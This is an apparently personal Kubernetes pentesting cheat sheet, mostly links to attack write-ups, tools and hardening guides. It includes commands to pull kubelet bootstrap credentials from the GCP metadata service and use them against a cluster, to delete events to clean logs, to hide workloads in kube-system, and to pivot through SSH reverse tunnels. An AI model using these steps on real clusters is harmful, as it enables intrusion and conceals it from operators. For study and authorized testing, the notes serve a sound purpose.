		
		### Security minimap ###
		https://i.redd.it/5mx1spqfy6c71.jpg

		### Vulnerable Kubernetes Enviroment
		- https://github.com/madhuakula/kubernetes-goat
		
		### Kubernetes Vector Attacks ###
		- Acces to machines/VMS (nodes by ssh)
		- Acces etcd API
		- Acces via kubernetes API or proxy
		- Intercep/modify/onject control-plane trafic
		- Acces via Kubelet API
		- Escape contaienr to host though vulnerability os volume mount
		- Intercept/modify/inject application trafic
		- Exploit vulneravility in aplication code

		### Decode Tockens ###
		- https://jwt.io/

		## Pentesting procedures
		- https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1
		- https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2
		- https://github.com/calinah/learn-by-hacking-kccn/blob/master/Learn%20by%20Hacking.pdf

		## Hacking Kubernetes ###
		- http://www.elladodelmal.com/2019/01/hacking-kubernetes-auditoria-de.html
		- https://www.4armed.com/blog/hacking-kubelet-on-gke/
		- https://medium.com/@pczarkowski/the-kubernetes-api-call-is-coming-from-inside-the-cluster-f1a115bd2066

		### Know Vulneravility - From POD to Cluster Admin ###
		- https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216
		- https://www.4armed.com/blog/kubeletmein-kubelet-hacking-tool/
		- https://github.com/bgeesaman/kube-env-stealer
			* https://www.4armed.com/blog/hacking-kubelet-on-gke/
			* Execut inside a pod to see if the cluster is vulnerable
				$ curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env

		- Decode token obtainded
			$ echo -n "[token]" | base64 -d

		- Use results:
			* ./kubectl --client-certificate bootstrap/kubelet-bootstrap.crt --client-key bootstrap kubelet-bootstrap.key  --certificate-authority bootstrap/ca.crt --server https://35.198.87.27 get certificatesigningrequests

		## Scape From Pods
		https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4

		## Exploit Healcheck API ##
		- https://securityboulevard.com/2019/01/kubernetes-unauth-kublet-api-10250-basic-code-exec/
		- https://gist.github.com/lizrice/c32740fac51db2a5518f06c3dae4944f

		## DNS Spooofing to Kubernetes cluster ##
		- https://blog.aquasec.com/dns-spoofing-kubernetes-clusters
		- https://github.com/danielsagi/kube-dnsspoof/

		## Scaping from PODs ##
		- https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts
		- https://github.com/danielsagi/kube-pod-escape
		- https://unaaldia.hispasec.com/2019/04/vulnerabilidad-en-kubernetes-mal-parcheada-permite-realizar-un-directory-traversal-en-el-copiado.html
		- https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

		## Criptomaining atacks ##
		- https://blog.aquasec.com/crypto-mining-malware-container-security
		- https://blog.trendmicro.com/trendlabs-security-intelligence/infected-cryptocurrency-mining-containers-target-docker-hosts-with-exposed-apis-use-shodan-to-find-additional-victims/

		## Kube Thanos
		https://github.com/berkay-dincer/kubethanos/blob/master/README.md

		## Kube Audit Roles and Permisions
		https://github.com/cyberark/kubernetes-rbac-audit

		## Mitre Attack
		https://github.com/aquasecurity/kube-hunter#kuberentes-attck-matrix
		https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

		## OWASP K8s
		https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html

		## Clean kubernetes logs
		kubectl delete events–all

		# Mimetizarse
		deployarse en kube-system

		# Pivotig inside pod to service
		- ssh-keygen 		# copi publik key and copi it into the machine (maive a internet jump machine)
		- ssh -R [port]:[new-services-to-acces]:[Port] -i [ublic-Key] user@jumping-machine -vv
			# If you ar using a jumping machine you must need other tunel with
			- -L [Port]:localhost:[Port]

		## Load image in to de cluster from file
		https://stackoverflow.com/questions/58916308/kubernetes-deploy-with-tar-docker-image

		## Aqua Kube-Hunter Vulneravility Descriptions
		https://aquasecurity.github.io/kube-hunter/

		## Load image from local image
			imagePullPolicy: IfNotPresent

		## Validate deployments
		https://learnk8s.io/validating-kubernetes-yaml

		## MITRE
		https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/
		https://attack.mitre.org/techniques/T1525/

		## Hack-misconfiguration
		https://github.com/vchinnipilli/kubestriker

		## Kube-Read
		https://github.com/lightspin-tech/red-kube

		## Pentesting Tool
		https://github.com/inguardians/peirates
		--> Documentation: https://www.inguardians.com/peirates/

		## C2C malware case on Windows K8s
		https://unit42.paloaltonetworks.com/siloscape/

		## Get images running on each pod in the cluster
		> Crete file images.fmt with the content:
		NAMESPACE            NAME           IMAGE
		metadata.namespace   metadata.name  spec.containers[0].image

		> kubectl get pods -A -o custom-columns-file=images.fmt

		## cve-2022-0185
		https://www.armosec.io/blog/cve-2022-0185-kubernetes-users/

		## Comon vulneravilitys Check
		https://github.com/armosec/kubescape

			## Controls
			https://hub.armo.cloud/docs/controls

			## NSA Controls
			https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2716980/nsa-cisa-release-kubernetes-hardening-guidance/
			- kubescape scan framework nsa

			## Mitre Controls
			- kubescape scan framework mitre

		## CVE-2020–15257: k8s exploit hostNetwork: true
		- Kubernetes users are affected if they are using containerd as the CRI runtime and running pods with .spec.hostNetwork: true without setting .spec.securityContext.runAsUser
		- https://medium.com/nttlabs/dont-use-host-network-namespace-f548aeeef575
		- https://blog.aquasec.com/cve-2020-15257-containerd-shim-api-vulnerability
		- https://www.fatalerrors.org/a/cve-2020-15257-escape-docker-with-containerd-shim-api-under-host.html
		- How to check
		    $ kubectl get pods -A -o json | jq -c '.items[] | select(.spec.hostNetwork==true) |[.metadata.namespace, .metadata.name]'

 

